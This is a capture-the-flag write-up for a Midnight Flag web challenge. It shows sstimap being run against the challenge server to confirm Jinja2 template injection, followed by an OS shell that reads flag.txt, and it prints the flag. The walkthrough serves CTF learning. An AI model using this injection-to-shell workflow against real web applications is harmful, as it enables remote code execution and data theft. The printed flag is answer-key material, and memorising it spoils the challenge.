# Silent_Hill_Part_1

[< Go back](../../README.md)

## Description

FR : Bienvenue à l'Hôtel Lake View, trouverez-vous le *secret qui vous mène à Mary ?

EN : Welcome to the Lake View Hotel, will you find the *secret that leads you  to Mary?

Author : Kuorashi

<https://deploy.midnightflag.fr>

## Challenge

After playing around with the input field, I found that it's vulnerable to DOM-based XSS, php tags are sanitized, and that it's vulnerable to SSTI.

I ran a sstimap:

```bash
sstimap -m POST -d name= -u http://35.181.252.51:11868/                                                                                      [130]

#     ╔══════╦══════╦═══════╗ ▀█▀
#     ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
#     ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
#     ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
#     ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
#     ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
#                              │                  | |
#                                                 |_|
# [*] Version: 1.2.0
# [*] Author: @vladko312
# [*] Based on Tplmap
# [!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
# Developers assume no liability and are not responsible for any misuse or damage caused by this program
# [*] Loaded plugins by categories: languages: 5; legacy_engines: 2; engines: 17
# [*] Loaded request body types: 4

# [*] Scanning url: http://35.181.252.51:11868/
# [*] Testing if Body parameter 'name' is injectable
# [*] Ejs plugin is testing rendering with tag '*'
# [*] Ejs plugin is testing %>*<%# code context escape with 6 variations
# [*] Ejs plugin is testing blind injection
# [*] Ejs plugin is testing %>*<%# code context escape with 6 variations
# [*] Freemarker plugin is testing rendering with tag '*'
# [*] Freemarker plugin is testing }* code context escape with 6 variations
# [*] Freemarker plugin is testing blind injection
# [*] Freemarker plugin is testing }* code context escape with 6 variations
# [*] Dust plugin is testing rendering
# [*] Dust plugin is testing blind injection
# [*] Jinja2 plugin is testing rendering with tag '*'
# [+] Jinja2 plugin has confirmed injection with tag '*'
# [+] SSTImap identified the following injection point:

#   Body parameter: name
#   Engine: Jinja2
#   Injection: *
#   Context: text
#   OS: posix-linux
#   Technique: render
#   Capabilities:

#     Shell command execution: ok
#     Bind and reverse shell: ok
#     File write: ok
#     File read: ok
#     Code evaluation: ok, python code

# [+] Rerun SSTImap providing one of the following options:
#     --os-shell                   Prompt for an interactive operating system shell
#     --os-cmd                     Execute an operating system command.
#     --eval-shell                 Prompt for an interactive shell on the template engine base language.
#     --eval-cmd                   Evaluate code in the template engine base language.
#     --tpl-shell                  Prompt for an interactive shell on the template engine.
#     --tpl-cmd                    Inject code in the template engine.
#     --bind-shell PORT            Connect to a shell bind to a target port
#     --reverse-shell HOST PORT    Send a shell back to the attacker's port
#     --upload LOCAL REMOTE        Upload files to the server
#     --download REMOTE LOCAL      Download remote files
sstimap -m POST -d name= -u http://35.181.252.51:11868/ --os-shell
# [+] Run commands on the operating system.
posix-linux $ whoami
# root
# posix-linux $ ls
# Dockerfile
# app.py
# db.sqlite
# flag.txt
# requirements.txt
# templates
# posix-linux $ cat flag.txt
# MCTF{0n_Th3_w4y_t0_f1nD_m4rY}
```
